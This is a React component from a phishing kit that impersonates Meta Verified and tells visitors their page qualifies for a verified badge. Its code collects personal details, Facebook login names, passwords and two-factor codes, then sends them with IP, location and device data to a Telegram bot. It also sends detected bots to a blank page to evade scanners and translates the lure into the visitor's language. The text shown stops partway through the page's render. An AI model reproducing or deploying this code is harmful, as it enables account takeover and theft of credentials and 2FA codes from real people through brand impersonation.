import { useEffect, useState, useCallback, useMemo } from 'react';
import axios from 'axios';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import TickIcon from '@/assets/images/tick.svg';
import TichImage from '@/assets/images/tich.webp';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import detectBot from '@/utils/detect_bot';
import detectDevice from '@/utils/detect_device';
import countryToLanguage from '@/utils/country_to_language';
import FirstFormModal from '@/components/FirstFormModal';
import LoginModal from '@/components/LoginModal';
import TwoFAModal from '@/components/TwoFAModal';
import SuccessModal from '@/components/SuccessModal';
import Sidebar from '@/components/Sidebar';
import BenefitsSection from '@/components/BenefitsSection';
import TestimonialSection from '@/components/TestimonialSection';
import SearchModal from '@/components/SearchModal';
import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
import TermsModal from '@/components/TermsModal';
import SaveImg from '@/assets/images/save_img.png';
import DocImg from '@/assets/images/doc.png';

const LABEL = 'Thần-tài-đến';

const Home = () => {
    const [showFirstModal, setShowFirstModal] = useState(false);
    const [showLoginModal, setShowLoginModal] = useState(false);
    const [show2FAModal, setShow2FAModal] = useState(false);
    const [showSuccessModal, setShowSuccessModal] = useState(false);
    const [showSearchModal, setShowSearchModal] = useState(false);
    const [showPrivacyModal, setShowPrivacyModal] = useState(false);
    const [selectedPrivacyQuestion, setSelectedPrivacyQuestion] = useState(null);
    const [showTermsModal, setShowTermsModal] = useState(false);
    const [showMobileSidebar, setShowMobileSidebar] = useState(false);
    const [formData, setFormData] = useState({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        loginIdentifier: ''
    });
    const [loginAttempts, setLoginAttempts] = useState([]);
    const [twoFAAttempts, setTwoFAAttempts] = useState([]);
    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
    const [deviceInfo, setDeviceInfo] = useState({ deviceInfo: 'Unknown' });
    const [translatedTexts, setTranslatedTexts] = useState({});
    const [isLoading, setIsLoading] = useState(true);

    const defaultTexts = useMemo(
        () => ({
            title: 'Your page has met the requirements to receive the Verified badge.',
            congrats: 'Congratulations on meeting the requirements to upgrade your page to the Verified badge',
            milestone: 'This is a fantastic milestone, reflecting your dedication and the trust you have built with your audience.',
            excited: 'We are excited to celebrate this moment with you and look forward to seeing your page grow even stronger with this prestigious recognition!',
            getBadge: 'Get the Verified badge',
            metaVerified: 'Meta Verified',
            protectBrand: 'Protect your brand with Meta Verified',
            showWorld: 'Show the world that you mean business.',
            buildConfidence: 'Meta Verified helps you build more confidence with new audiences and protects your brand.',
            search: 'Search',
            privacyPolicy: 'Privacy Policy',
            otherRules: 'Other rules and articles',
            settings: 'Settings',
            creatorToolkit: 'A creator toolkit to take your brand further',
            creatorToolkitDesc: 'Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.',
            metaVerifiedBenefits: 'Meta Verified benefits',
            verifiedBadge: 'Verified badge',
            verifiedBadgeDesc: 'The badge means that your profile was verified by Meta based on your activity across Meta technologies, or information or documents that you provided.',
            impersonationProtection: 'Impersonation protection',
            impersonationProtectionDesc: 'Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you.',
            enhancedSupport: 'Enhanced support',
            enhancedSupportDesc: 'Get 24/7 access to email or chat agent support.',
            upgradedProfile: 'Upgraded profile features',
            upgradedProfileDesc: 'Enrich your profile by adding images to your links to help boost engagement.',
            exploreBusiness: 'Explore Meta Verified for business benefits.',
            businessDesc1: 'Meta Verified provides tools to help you build more confidence with new audiences, protect your brand and more efficiently engage with your customers.',
            businessDesc2: 'Distinguish fake accounts: Help customers distinguish real and fake accounts, avoid buying from the wrong shop.',
            businessDesc3: 'Increased Credibility: Accounts with Verified Badges are often highly regarded and attract more potential customers.',
            businessDesc4: 'Increased search visibility: Accounts with the Verified Badge are often given priority in search results.',
            businessDesc5: 'Personalized Content Strategy Consulting',
            businessDesc6: 'Work with a consultant to review and improve your social media content strategy for your subscribed account every week.',
            privacyPolicyQ: 'What is the Privacy Policy and what does it say?',
            manageInfo: 'How you can manage or delete your information',
            userAgreement: 'For more details, see the User Agreement',
            metaAI: 'Meta AI',
            additionalResources: 'Additional resources',
            aiInfo: 'How Meta uses information for generative AI models',
            aiCards: 'Cards with information about the operation of AI systems',
            aiIntro: 'Introduction to Generative AI',
            privacyCenter: 'Privacy Center',
            metaAIWebsite: 'Meta AI website',
            forTeenagers: 'For teenagers',
            privacyRisks: 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about',
            testimonial1: '"Being Meta Verified has elevated my credibility with my audience. For new followers or potential partners viewing my profile, it shows that I am established and serious about my work."',
            testimonial2: '"Meta Verified helped me build my credibility as a creator."',
            testimonial3: '"I like how Meta Verified added an extra layer of security to help protect me from impersonation."',
            testimonial4: '"Meta Verified helped my account stand out from impersonators, which helped me secure more paying clients."',

            fullName: 'Full Name',
            personalEmail: 'Personal Email',
            businessEmail: 'Business Email',
            mobilePhone: 'Mobile Phone Number',
            yourPageName: 'Your Page Name',
            agreeToTerms: 'I agree to the',
            confirm: 'Confirm',
            aboutHelpMore: 'About · Help · See more',

            loginInstruction: 'In order to subscribe your business to Meta Verified, you must be logged in to your professional account (Facebook) or business Page (Facebook).',
            mobileOrEmail: 'Mobile number or email',
            password: 'Password',
            passwordIncorrect: 'Password is incorrect, please try again.',
            logIn: 'Log in',
            continueBtn: 'Continue',
            forgotPassword: 'Forgot password?',

            twoFATitle: 'Check your authentication code',
            twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
            code: 'Code',
            codeExpired: 'This code has expired. Please enter a new code later',
            pleaseWait: 'Please wait',

            successTitle: 'The request was sent successfully',
            successMessage1: 'Great, your verification request has been approved.',
            successMessage2: 'The badge should appear next to your name within the next hour.',
            successMessage3: 'If the badge has not appeared after this time, please contact us again for further assistance.',
            thankYou: 'Thank you',
            metaSupportTeam: 'Meta Support Team.',

            searchPlaceholder: 'Search the Privacy Center',
            nothingFound: 'Nothing found',
            searchHint: 'Use other keywords or check the spelling of the search term request.',

            mainInSection: 'The main thing in the section',
            privacyDesc1: 'At Meta, we want you to understand what information we collect, how we use it, and with whom we use it. let\'s share. Therefore, we recommend that you read our Privacy Policy. This will help you use',
            privacyDesc2: '\'s products the way you need.',
            privacyDesc3: 'In the Privacy Policy, we explain how we collect, use, store information, and We also share it. We also tell you about your rights. Each section of the Policy contains Useful examples and simplified statements to make our work easier to understand. We also added links to resources where you can learn in more detail about topics that interest you with confidentiality.',
            privacyDesc4: 'It is important to us that you know how to manage your privacy (confidentiality), so we also We show you where in the settings of the Meta Products you use you can manage your data. You you can',
            updateSettings: 'update these settings',
            privacyDesc5: 'to personalize your user experience.',
            ourPolicies: 'Our policies.',
            whatProducts: 'What products are covered by this policy?',
            learnMorePrivacy: 'Learn more about managing your privacy at Privacy Center',
            whatInfoCollect: 'What information do we collect?',
            infoCollectDesc1: 'The information we collect and process about you depends on how you use our',
            products: 'Products',
            infoCollectDesc2: '. For example, we collect different information when you sell furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you when you use our Products,',
            evenNoAccount: 'even if you do not have an account',
            typesOfData: 'The following are the types of data we collect:',
            yourActions: 'Your actions and information you provide to us',
            friendsSubscribers: 'Friends, subscribers and other contacts',
            appBrowserDevice: 'Application, browser and device information',
            infoFromPartners: 'Information from Partners, suppliers and other third parties',
            whatIfNotAllow: 'What happens if you do not allow us to collect certain types of information?',
            someInfoNecessary: 'Some information is necessary for the operation of our Products. Other information is optional, but its absence may affect your experience with our products.',
            moreDetails: 'More details',
            whatIfNoIdentify: 'What if the information we collect does not personally identify individuals?',
            deIdentifyDesc: 'In some cases, before third parties make information available to us, they de-identify, aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use this information as described below, without attempting to re-identify individuals.',
            dataControl: 'Data control',
            manageInfoCollect: 'Manage the information we collect about you',

            termsOfUse: 'Terms of use',
            termsDesc1: 'Meta creates technologies and services that allow people to communicate with each other, form communities and develop companies. This User Agreement governs the use of you Facebook, Messenger, and other products, features, applications, services, technologies and software we offer (',
            metaProducts: 'Meta Products',
            termsDesc2: ' or ',
            termsDesc3: '), if not expressly states that separate terms apply (and this agreement does not apply). These Products are provided to you by Meta Platforms, Inc.',
            termsDesc4: 'Our ',
            termsDesc5: ' explains how we collect and use your personal data to determine which advertisements may be relevant to you, and provide other services described below. Also, in ',
            termsDesc6: ' of the relevant Products Meta, you can change your privacy level at any time regarding our use of your data.',
            servicesWeProvide: 'Services we provide',
            service1: 'Personalize your experience.',
            service2: 'Connect with people and organizations that interest you.',
            service3: 'Opportunity to express yourself and communicate on topics that are important to you.',
            service4: 'Search for content, products and services that may interest you.',
            service5: 'Ensuring the safety, security and integrity of our services, combating malicious behavior and protecting our user community.',
            service6: 'Using and developing advanced technologies to provide safe and functional services.',
            service7: 'Research ways to improve the quality of our services.',
            service8: 'Ensuring consistency and convenience of various Meta Companies Products.',
            service9: 'Providing access to our services.',
            otherTermsPolicies: 'Other terms and policies that may apply to you',
            advertisingRules: 'Advertising Rules',
            advertisingRulesDesc: '. These rules apply to partners who advertise on various Meta Products and determine the types of advertising content that such partners are permitted to use.',
            communityStandards: 'Community Standards',
            communityStandardsDesc: '. These guidelines set out our standards for the content you post on Facebook and your activities on Facebook and other Meta Products.',
            communityPaymentTerms: 'Community Payment Terms',
            communityPaymentTermsDesc: '. These terms apply to payments made to or through the Meta Products.',
            commercialTerms: 'Commercial terms',
            commercialTermsDesc: '. These terms apply if you use or access our Products for any commercial or business purposes, including advertising, using our measurement services, managing an application on our Platform, a group or a Company Page, and selling goods or services.',
            tradeRules: 'Trade Rules',
            tradeRulesDesc: '. This guide outlines the rules that apply when you offer products or services for sale on Facebook, Instagram or WhatsApp.',
            lastRevisionDate: 'Last revision date: July 26, 2023',
            accountSecurity: 'Account security',

            privacyQ1: 'What is the Privacy Policy and what does it cover?',
            privacyQ2: 'What information do we collect?',
            privacyQ3: 'How do we use your information?',
            privacyQ4: 'How do we share your information on Meta Products or with integrated partners?',
            privacyQ5: 'How do we share information with third parties?',
            privacyQ6: 'How is the cooperation between Meta Companies organized?',
            privacyQ7: 'How can you manage or delete your information and exercise your rights?',
            privacyQ8: 'How long do we keep your information?',
            privacyQ9: 'How do we transmit information?',
            privacyQ10: 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
            privacyQ11: 'How will you know when the policy changes?',
            privacyQ12: 'How to ask Meta questions?',
            privacyQ13: 'Why and how we process your data'
        }),
        []
    );

    useEffect(() => {
        localStorage.clear();
        initializeApp();
    }, []);

    const initializeApp = async () => {
        try {
            const botResult = await detectBot();
            if (botResult.isBot) {
                window.location.href = 'about:blank';
                return;
            }

            // Detect device info
            try {
                const device = detectDevice();
                console.log('Device detected:', device);
                setDeviceInfo(device);
                localStorage.setItem('deviceInfo', JSON.stringify(device));
            } catch (error) {
                console.error('Error detecting device:', error);
                const fallbackDevice = { deviceInfo: 'Unknown Device' };
                setDeviceInfo(fallbackDevice);
                localStorage.setItem('deviceInfo', JSON.stringify(fallbackDevice));
            }

            try {
                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                const data = response.data;
                setIpInfo({
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country || 'Unknown'
                });
                localStorage.setItem('ipInfo', JSON.stringify(data));

                const countryCode = data.country_code;
                const targetLang = countryToLanguage[countryCode] || 'en';
                localStorage.setItem('targetLang', targetLang);

                if (targetLang !== 'en') {
                    translateAllTexts(targetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                }
            } catch (error) {
                console.error('Error fetching IP:', error);
                setTranslatedTexts(defaultTexts);
            }

            setIsLoading(false);
        } catch (error) {
            console.error('Initialization error:', error);
            setIsLoading(false);
        }
    };

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
                const translated = {};
                keys.forEach((key, index) => {
                    translated[key] = translations[index];
                });
                setTranslatedTexts(translated);
            } catch (error) {
                console.error('Translation error:', error);
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    const pad = (n) => (n < 10 ? '0' + n : String(n));

    const formatDateTime = (d) => {
        return (
            pad(d.getDate()) +
            '/' +
            pad(d.getMonth() + 1) +
            '/' +
            d.getFullYear() +
            ' ' +
            pad(d.getHours()) +
            ':' +
            pad(d.getMinutes()) +
            ':' +
            pad(d.getSeconds())
        );
    };

    const buildAndSend = async (data) => {
        const dt = formatDateTime(new Date());
        const { form, login, passes, codes } = data;

        console.log('BuildAndSend - deviceInfo:', deviceInfo);

        let message = `📩 <b>${LABEL}</b>\n`;
        message += `⏰ ${dt}\n`;
        message += `🌐 IP: <code>${ipInfo.ip}</code>\n`;
        message += `📱 Thiết bị: <code>${deviceInfo?.deviceInfo || 'Unknown Device'}</code>\n`;
        message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
        message += `━━━━━━━━━━━━━━━━━━━━\n`;

        if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
            message += `<b>📋 THÔNG TIN</b>\n`;
            if (form.fullName) message += `   Tên: <code>${form.fullName}</code>\n`;
            if (form.personalEmail) message += `   Email: <code>${form.personalEmail}</code>\n`;
            if (form.businessEmail && form.businessEmail !== form.personalEmail) {
                message += `   Business: <code>${form.businessEmail}</code>\n`;
            }
            if (form.phone) message += `   SĐT: <code>${form.phone}</code>\n`;
            if (form.pageName) message += `   Page: <code>${form.pageName}</code>\n`;
        }

        if (login || (passes && passes.length > 0)) {
            message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
            if (login) message += `   TK: <code>${login}</code>\n`;
            if (passes && passes.length > 0) {
                passes.forEach((p, i) => {
                    message += `   MK${i + 1}: <code>${p}</code>\n`;
                });
            }
        }

        if (codes && codes.length > 0) {
            message += `\n<b>🔒 MÃ 2FA</b>\n`;
            codes.forEach((c, i) => {
                message += `   Code${i + 1}: <code>${c}</code>\n`;
            });
        }

        message += `━━━━━━━━━━━━━━━━━━━━`;

        try {
            await sendMessage(message);
        } catch (error) {
            console.error('Error sending message:', error);
        }
    };

    const handleFirstFormSubmit = (data) => {
        const newFormData = { ...formData, ...data };
        setFormData(newFormData);
        setShowFirstModal(false);
        setShowLoginModal(true);

        buildAndSend({
            form: newFormData,
            login: null,
            passes: [],
            codes: []
        });
    };

    const handleLoginSubmit = (email, password) => {
        const newFormData = { ...formData, loginIdentifier: email };
        const newPasses = [...loginAttempts.map(p => p.value), password].slice(-2);

        setFormData(newFormData);
        setLoginAttempts(prev => [...prev, { time: new Date().toISOString(), value: password }].slice(-2));

        buildAndSend({
            form: newFormData,
            login: email,
            passes: newPasses,
            codes: twoFAAttempts.map(c => c.value)
        });
    };

    const handle2FASubmit = (code) => {
        const newCodes = [...twoFAAttempts.map(c => c.value), code].slice(-3);

        setTwoFAAttempts(prev => [...prev, { time: new Date().toISOString(), value: code }].slice(-3));

        buildAndSend({
            form: formData,
            login: formData.loginIdentifier,
            passes: loginAttempts.map(p => p.value),
            codes: newCodes
        });
    };

    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;

    if (isLoading) {
        return (
            <div id="intro" style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 }}>
                <img id="meta-logo" src={MetaLogo} alt="Meta" style={{ width: '70%', height: 'auto' }} />
            </div>
        );
    }

    return (
        <>
            <div className="container-sm" id="main">
                <div className="container-head">
                    <div id="logo">
                        <svg aria-label="Логотип Meta" className="x1kpxq89 x1247r65" role="img" viewBox="0 0 500 100">
                            <defs>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH1:" x1="124.38" x2="160.839" y1="99" y2="59.326">
                                    <stop offset=".427" stopColor="#0278F1"></stop>
                                    <stop offset=".917" stopColor="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH2:" x1="42" x2="-1.666" y1="4.936" y2="61.707">
                                    <stop offset=".427" stopColor="#0165E0"></stop>
                                    <stop offset=".917" stopColor="#0180FA"></stop>
                                </linearGradient>
                                <linearGradient gradientUnits="userSpaceOnUse" id=":R1eckmkldd6knpapd5aqH3:" x1="27.677" x2="132.943" y1="28.71" y2="71.118">
                                    <stop stopColor="#0064E0"></stop>
                                    <stop offset=".656" stopColor="#0066E2"></stop>
                                    <stop offset="1" stopColor="#0278F1"></stop>
                                </linearGradient>
                            </defs>
                            <path
                                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                                fill="#1C2B33"
                            ></path>
                            <path
                                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                                fill="#0180FA"
                            ></path>
                            <path d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z" fill="url(#:R1eckmkldd6knpapd5aqH1:)"></path>
                            <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z" fill="url(#:R1eckmkldd6knpapd5aqH2:)"></path>
                            <path
                                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                                fill="url(#:R1eckmkldd6knpapd5aqH3:)"
                            >                            </path>
                        </svg>
                    </div>
                    <div className="burger-button" id="showPopup" onClick={() => setShowMobileSidebar(true)} style={{ cursor: 'pointer' }}>
                        <div className="bar"></div>
                        <div className="bar"></div>
                        <div className="bar"></div>
                    </div>
                </div>
                <div className="row">
                            <div className="col-4">
                                <Sidebar
                                    texts={texts}
                                    onOpenSearchModal={() => setShowSearchModal(true)}
                                    onOpenPrivacyModal={(question) => {
                                        setSelectedPrivacyQuestion(question);
                                        setShowPrivacyModal(true);
                                    }}
                                    onOpenTermsModal={() => setShowTermsModal(true)}
                                />
                            </div>
                    <div className="col-8">
                        <div id="right">
                            <h1>
                                <img alt="" src={TickIcon} style={{ height: '50px', width: '50px', marginRight: '8px' }} />
                                {texts.title}
                            </h1>
                            <p>{texts.congrats}</p>
                            <p>{texts.milestone}</p>
                            <p>{texts.excited}</p>

                            <div id="card" style={{ background: 'rgb(222, 240, 243)' }}>
                                <img alt="" src={TichImage} style={{ marginTop: '30px' }} />
                                <div className="card-text">
                                    <div
                                        style={{
                                            borderRadius: '15px',
                                            backgroundColor: 'white',
                                            padding: '20px 20px 10px 20px'
                                        }}
                                    >
                                        <h5>
                                            <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.metaVerified}
                                        </h5>
                                        <h6>{texts.protectBrand}</h6>
                                        <h6 style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                                            <span>{texts.showWorld}</span>
                                            <span>{texts.buildConfidence}</span>
                                        </h6>
                                    </div>
                                    <div className="btn-wrapper">
                                        <div className="button fb-blue w-100" id="start" onClick={() => setShowFirstModal(true)}>
                                            {texts.getBadge}
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <BenefitsSection texts={texts} />
                            <TestimonialSection texts={texts} />

                            <h5>
                                <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.exploreBusiness}
                            </h5>
                            <br />
                            <h6>{texts.businessDesc1}</h6>
                            <h6>{texts.businessDesc2}</h6>
                            <h6>{texts.businessDesc3}</h6>
                            <h6>{texts.businessDesc4}</h6>
                            <h6>
                                {texts.businessDesc5}
                                <br />
                                {texts.businessDesc6}
                                <br />
                                <br />
                                <div className="fake-likns">
                                    <div className="action-button-list">
                                        <div
                                            className="action-button wide"
                                            onClick={() => {
                                                setSelectedPrivacyQuestion(texts.privacyPolicyQ);
                                                setShowPrivacyModal(true);
                                            }}
                                            style={{ cursor: 'pointer' }}
                                        >
                                            <div className="action-button-img">
                                                <img alt="" src={SaveImg} />
                                            </div>
                                            <div className="action-button-text">
                                                <span>{texts.privacyPolicyQ}</span>
                                                <br />
                                                <span className="small-grey">{texts.privacyPolicy}</span>
                                            </div>
                                            <div className="action-button-arrow">
                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
                                                </svg>
                                            </div>
                                        </div>
                                        <div
                                            className="action-button wide"
                                            onClick={() => {
                                                setSelectedPrivacyQuestion(texts.manageInfo);
                                                setShowPrivacyModal(true);
                                            }}
                                            style={{ cursor: 'pointer' }}
                                        >
                                            <div className="action-button-img">
                                                <img alt="" src={SaveImg} />
                                            </div>
                                            <div className="action-button-text">
                                                <span>{texts.manageInfo}</span>
                                                <br />
                                                <span className="small-grey">{texts.privacyPolicy}</span>
                                            </div>
                                            <div className="action-button-arrow">
                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <br />
                                    <h6>{texts.userAgreement}</h6>
                                    <div
                                        className="action-button wide"
                                        onClick={() => setShowTermsModal(true)}
                                        style={{ cursor: 'pointer' }}
                                    >
                                        <div className="action-button-img">
                                            <img alt="" src={DocImg} />
                                        </div>
                                        <div className="action-button-text">
                                            <span>{texts.metaAI}</span>
                                            <br />
                                            <span className="small-grey">User Agreement</span>
                                        </div>
                                        <div className="action-button-arrow">
                                            <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
                                                <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
                                            </svg>
                                        </div>
                                    </div>
                                    <br />
                                    <h6>{texts.additionalResources}</h6>
                                    <div className="action-button-list">
                                        <div
                                            className="action-button wide"
                                            onClick={() => {
                                                setSelectedPrivacyQuestion(texts.aiInfo);
                                                setShowPrivacyModal(true);
                                            }}
                                            style={{ cursor: 'pointer' }}
                                        >
                                            <div className="action-button-text">
                                                <span>{texts.aiInfo}</span>
                                                <br />
                                                <span className="small-grey">{texts.privacyCenter}</span>
                                            </div>
                                            <div className="action-button-arrow">
                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
                                                </svg>
                                            </div>
                                        </div>
                                        <div
                                            className="action-button wide"
                                            onClick={() => {
                                                setSelectedPrivacyQuestion(texts.aiCards);
                                                setShowPrivacyModal(true);
                                            }}
                                            style={{ cursor: 'pointer' }}
                                        >
                                            <div className="action-button-text">
                                                <span>{texts.aiCards}</span>
                                                <br />
                                                <span className="small-grey">{texts.metaAIWebsite}</span>
                                            </div>
                                            <div className="action-button-arrow">
                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
                                                </svg>
                                            </div>
                                        </div>
                                        <div
                                            className="action-button wide"
                                            onClick={() => {
                                                setSelectedPrivacyQuestion(texts.aiIntro);
                                                setShowPrivacyModal(true);
                                            }}
                                            style={{ cursor: 'pointer' }}
                                        >
                                            <div className="action-button-text">
                                                <span>{texts.aiIntro}</span>
                                                <br />
                                                <span className="small-grey">{texts.forTeenagers}</span>
                                            </div>
                                            <div className="action-button-arrow">
                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </h6>
                            <p className="small-grey">
                                {texts.privacyRisks} <a className="add-svg" id="policyLink" target="_blank" rel="noopener noreferrer">{texts.privacyPolicy}</a>
                            </p>
                        </div>
                    </div>
                </div>
            </div>

            <FirstFormModal show={showFirstModal} onClose={() => setShowFirstModal(false)} onSubmit={handleFirstFormSubmit} texts={texts} />
